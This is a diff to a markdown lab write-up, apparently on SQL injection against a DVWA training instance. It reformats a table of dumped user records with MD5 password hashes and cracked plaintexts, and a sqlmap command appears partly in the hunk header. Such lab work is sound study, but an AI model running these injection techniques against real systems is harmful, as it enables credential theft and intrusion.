@@ -77,14 +77,14 @@ sqlmap -u "http://192.168.1.7/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p
 #### Results:
 
 - Extracted Data:
-  | user_id | user | password ||first_name | |first_name| ||
-  |---------|-------------|-----------------------------------------||-----------| |----------|
-  | 1 | admin | 21232f297a57a5a743894a0e4a801fc3 (admin) || admin | | admin |
-  | 2 | guest | e99a18c428cb38d5f260853678922e03 (abc123) || Brown | | Gordon |
-  | 3 | 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b (charley) || Me | | Hack |
-  | 4 | pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein) || Picasso | | Pablo |
-  | 5 | smithy | 5f4dcc3b5aa765d61d8327deb882cf99 (password) || Smith | | Bob |
-  | 6 | user | ee11cbb19052e40b07aac0ca060c23ee (user) || user | | user |
+  | user_id | user | password | (decrypted password) | first_name | last_name |
+  |---|---|---|---|---|---|
+  | 1 | admin | 21232f297a57a5a743894a0e4a801fc3 | (admin) | admin | admin |
+  | 2 | guest | e99a18c428cb38d5f260853678922e03 | (abc123) | Brown | Gordon |
+  | 3 | 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b | (charley) | Me | Hack |
+  | 4 | pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 | (letmein) | Picasso | Pablo |
+  | 5 | smithy | 5f4dcc3b5aa765d61d8327deb882cf99 | (password) | Smith | Bob |
+  | 6 | user | ee11cbb19052e40b07aac0ca060c23ee | (user) | user | user |
 
 ---
 
